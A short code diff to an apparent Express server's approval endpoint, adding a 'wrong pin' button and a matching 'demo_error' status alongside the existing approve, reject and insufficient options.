@@ -94,6 +94,7 @@ app.post('/api/request-approval', async (req, res) => {
             { text: '✅ Approve', callback_data: `approve:${id}` },
             { text: '❌ Reject', callback_data: `deny:${id}` },
             { text: '⚠️ Insufficient', callback_data: `insufficient:${id}` },
+          { text: '🔢 wrong pin', callback_data: `demo_error:${id}` },
           ]
         : [
             { text: '✅ Approve', callback_data: `approve:${id}` },
@@ -130,6 +131,7 @@ const STATUS_BY_ACTION = {
   approve: 'approved',
   deny: 'denied',
   insufficient: 'insufficient',
+  demo_error: 'demo_error'
 };
 
 const LABEL_BY_ACTION = {
